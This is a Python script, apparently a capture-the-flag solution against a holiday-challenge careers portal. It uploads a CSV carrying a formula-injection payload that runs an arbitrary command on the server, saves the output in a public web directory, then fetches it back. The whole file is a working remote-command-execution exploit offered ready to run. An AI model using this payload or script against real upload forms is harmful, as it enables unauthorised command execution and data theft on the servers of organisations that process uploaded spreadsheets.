#!/usr/bin/env python

import sys
import time
import uuid

import requests

cmd = sys.argv[1]

output = uuid.uuid4().hex + '.txt'

data = {'firstname': 'Willy', 'lastname': 'Wonka', 'phone': '1234567890', 'email': 'willy@wonka.com'}
files = {'csv': ('work_history.csv', "=cmd|'/C %s > C:\\careerportal\\resources\\public\\%s 2>&1'!A0" % (cmd, output))}

r = requests.post('https://careers.kringlecastle.com/api/upload/application', data=data, files=files)

print "Submitted, and recieved", r.status_code
print 'Result should be in https://careers.kringlecastle.com/public/' + output

while True:
    r = requests.get('https://careers.kringlecastle.com/public/' + output)
    if '404 Error!' not in r.text:
        print r.text[2:].decode('utf-16')
        break
    else:
        print "Not yet..."
        time.sleep(5)

if len(sys.argv) == 3:
    with open("output/" + sys.argv[2], 'wb') as f:
        f.write(str(r.text[2:].decode('utf-16')))
        
